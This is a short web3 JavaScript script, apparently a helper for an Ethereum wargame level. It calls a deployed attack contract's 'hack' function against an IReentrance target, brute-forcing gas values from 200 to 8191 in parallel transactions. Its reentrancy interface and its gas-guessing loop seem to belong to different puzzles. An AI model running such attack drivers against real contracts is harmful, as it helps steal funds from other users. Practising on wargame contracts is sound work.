async function run() {
    const contractABI = [
	{
		"inputs": [
			{
				"internalType": "contract IReentrance",
				"name": "_target",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "gas",
				"type": "uint256"
			}
		],
		"name": "hack",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];
    const contractAddress = "0xAA90b7B478Ac31EBCc96551FEf5bEbeccdcD50c2";

    // Створюємо екземпляр контракту
    const attack = new web3.eth.Contract(contractABI, contractAddress);

    // Отримуємо акаунти
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0]; // Використовуємо перший акаунт

    // Створюємо масив промісів для паралельного виконання
    const promises = [];
    for (let i = 200; i <= 8191; i++) {
        const promise = attack.methods.hack(i).estimateGas({ from: sender })
            .then((gasEstimate) => {
                console.log("Estimated Gas for i=", i, gasEstimate);

                return attack.methods.hack(i).send({
                    from: sender,
                    gas: gasEstimate,
                    value: 0
                })
                .then((tx) => {
                    console.log("Transaction successful for i =", i, tx);
                    return tx;
                })
                .catch((error) => {
                    console.error("Transaction failed for i =", i, error);
                });
            })
            .catch((error) => {
                console.error("Gas estimation failed for i =", i, error);
            });
        
        // Додаємо проміс в масив
        promises.push(promise);
    }

    // Виконуємо всі проміси паралельно
    await Promise.all(promises);
    console.log("All transactions processed");
}

// Викликаємо функцію
run().catch(console.error);
